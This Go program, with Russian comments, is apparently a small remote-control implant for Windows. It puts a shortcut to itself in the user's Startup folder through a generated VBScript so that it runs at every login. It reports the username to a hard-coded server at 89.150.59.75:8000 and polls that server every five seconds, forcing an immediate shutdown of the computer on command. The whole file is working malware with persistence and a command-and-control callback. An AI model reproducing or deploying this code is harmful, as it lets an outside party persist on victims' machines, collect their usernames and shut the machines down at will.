package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"time"
)

type ResponseData struct {
	ClientID int `json:"your-id"`
}

type StatusCheck struct {
	Status bool `json:"Status"`
}

var IP = "89.150.59.75:8000"

func addToStartup() error {

	usr, err := user.Current()
	if err != nil {
		return err
	}

	// Путь к папке автозагрузки
	startupFolder := filepath.Join(usr.HomeDir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

	// Путь к текущему исполняемому файлу
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	// Имя ярлыка, который будет создан
	shortcutPath := filepath.Join(startupFolder, filepath.Base(exePath)+".lnk")

	comScript := `
Set oShell = CreateObject("WScript.Shell")
sLinkFile = "` + shortcutPath + `"
Set oLink = oShell.CreateShortcut(sLinkFile)
oLink.TargetPath = "` + exePath + `"
oLink.Save
`

	// Создание и выполнение VBScript, чтобы создать ярлык
	vbsFile := filepath.Join(os.TempDir(), "create_shortcut.vbs")
	err = os.WriteFile(vbsFile, []byte(comScript), 0644)
	if err != nil {
		return err
	}
	defer os.Remove(vbsFile)

	cmd := exec.Command("cscript", "//nologo", vbsFile)
	err = cmd.Run()
	if err != nil {
		return err
	}
	return nil
}

func main() {
	addToStartup()
	currentUser, err := user.Current()
	resp, err := http.Get(fmt.Sprintf("http://%s/register?name=%s", IP, currentUser.Username))
	if err != nil {
		log.Fatalf("Ошибка при выполнении запроса: %v", err)
	}
	defer resp.Body.Close()

	// Чтение тела ответа
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("Ошибка при чтении ответа: %v", err)
	}
	var data ResponseData
	err = json.Unmarshal(body, &data)
	if err != nil {
		log.Fatalf("Ошибка при декодировании JSON: %v", err)
	}

	for {
		resp, err = http.Get(fmt.Sprintf("http://%s/status/%d", IP, data.ClientID))
		body, err = ioutil.ReadAll(resp.Body)
		var status StatusCheck
		json.Unmarshal(body, &status)
		if !status.Status {
			cmd := exec.Command("shutdown", "/s", "/f", "/t", "1")
			err := cmd.Run()
			if err != nil {
				fmt.Println("Ошибка при выключении компьютера:", err)
			}
			break
		}
		time.Sleep(5 * time.Second)
	}
}
